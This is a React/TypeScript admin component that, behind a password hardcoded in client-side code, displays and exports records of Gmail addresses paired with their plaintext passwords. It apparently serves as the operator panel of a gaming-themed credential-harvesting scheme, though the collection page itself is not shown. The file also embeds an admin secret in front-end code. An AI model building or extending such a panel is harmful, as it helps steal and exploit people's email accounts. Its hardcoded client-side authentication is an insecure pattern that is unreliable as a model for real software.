
import React, { useState, useEffect } from 'react';
import { TranslationKeys } from '../translations';

interface AdminProps {
  cloudRecords: any[];
  onRefresh: () => void;
  cloudUrl: string;
  t: (key: TranslationKeys) => string;
}

const Admin: React.FC<AdminProps> = ({ cloudRecords, onRefresh, cloudUrl, t }) => {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  useEffect(() => {
    if (isAuthenticated) {
      onRefresh();
    }
  }, [isAuthenticated, onRefresh]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === 'fouad12jad1///') setIsAuthenticated(true);
    else alert('Unauthorized Terminal Access Attempted');
  };

  const handleDownload = () => {
    window.location.href = `${cloudUrl}?download=true`;
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-[80vh] flex items-center justify-center p-6 bg-slate-950">
        <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-12 rounded-[3rem] shadow-2xl text-center">
          <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-10 shadow-lg">
            <span className="text-white font-gaming font-black text-2xl">M</span>
          </div>
          <h1 className="text-lg font-gaming font-black text-white mb-10 uppercase tracking-widest">CLOUD COMMAND</h1>
          <form onSubmit={handleLogin} className="space-y-6">
            <input 
              type="password" 
              placeholder="SECRET KEY" 
              className="w-full bg-slate-950 border-2 border-slate-800 rounded-2xl px-8 py-5 text-white text-center focus:border-blue-500 outline-none text-lg font-gaming shadow-inner" 
              value={password} 
              onChange={(e) => setPassword(e.target.value)} 
            />
            <button className="w-full bg-blue-600 text-white font-gaming py-5 rounded-2xl tracking-widest font-black uppercase text-xs shadow-xl active:scale-95 transition-all">AUTHORIZE</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="pt-24 sm:pt-40 pb-24 max-w-7xl mx-auto px-4 sm:px-8 animate-fade-in bg-slate-950 min-h-screen">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-12 gap-6">
        <div>
          <h2 className="text-3xl font-gaming font-black text-white uppercase tracking-tight">Cloud Telemetry</h2>
          <p className="text-slate-500 text-[9px] font-gaming uppercase tracking-[0.4em] mt-2">Central Database Interface</p>
        </div>
        <div className="flex items-center space-x-4">
          <button 
            onClick={handleDownload}
            className="bg-slate-900 text-white px-8 py-4 rounded-xl font-gaming text-[10px] font-black uppercase border border-slate-800 hover:bg-slate-800 transition-all"
          >
            <i className="fas fa-file-csv mr-2 text-blue-400"></i> Export
          </button>
          <button 
            onClick={onRefresh}
            className="bg-blue-600 text-white px-8 py-4 rounded-xl font-gaming text-[10px] font-black uppercase shadow-lg hover:bg-blue-500 transition-all"
          >
            <i className="fas fa-sync-alt mr-2"></i> Sync Cloud
          </button>
        </div>
      </div>

      <div className="bg-slate-900/60 border border-slate-800 rounded-[2rem] overflow-hidden shadow-2xl backdrop-blur-xl">
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead className="bg-slate-950/50 border-b border-slate-800">
              <tr>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-500 uppercase tracking-widest">Gmail Identifier</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-500 uppercase tracking-widest">Security Key</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-500 uppercase tracking-widest">Registered At</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-500 uppercase tracking-widest text-center">Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800">
              {cloudRecords.length === 0 ? (
                <tr>
                  <td colSpan={4} className="py-32 text-center text-slate-600 font-gaming uppercase text-[10px] tracking-widest font-black animate-pulse">Syncing Cloud Database...</td>
                </tr>
              ) : (
                cloudRecords.map((record, idx) => (
                  <tr key={idx} className="hover:bg-slate-800/30 transition-colors">
                    <td className="py-6 px-8">
                      <div className="text-sm font-bold text-white">{record.gmail || "---"}</div>
                    </td>
                    <td className="py-6 px-8">
                      <div className="text-xs font-mono text-blue-400 bg-blue-500/10 px-4 py-1.5 rounded-lg w-fit border border-blue-500/20">{record.password || "••••"}</div>
                    </td>
                    <td className="py-6 px-8">
                      <div className="text-[10px] font-gaming text-slate-500 uppercase font-black">{record["date and time"] || "---"}</div>
                    </td>
                    <td className="py-6 px-8">
                      <div className="flex justify-center">
                        <span className={`text-[9px] font-gaming uppercase px-4 py-2 rounded-xl border font-black tracking-widest ${
                          String(record.statut).toLowerCase() === 'active' ? 'bg-green-500/10 text-green-500 border-green-500/20' : 
                          'bg-slate-800 text-slate-500 border-slate-700'
                        }`}>
                          {record.statut || "PENDING"}
                        </span>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
      
      <div className="mt-12 text-center">
        <p className="text-slate-600 text-[8px] font-gaming font-black uppercase tracking-[0.5em]">System Protocols Verified</p>
      </div>
    </div>
  );
};

export default Admin;
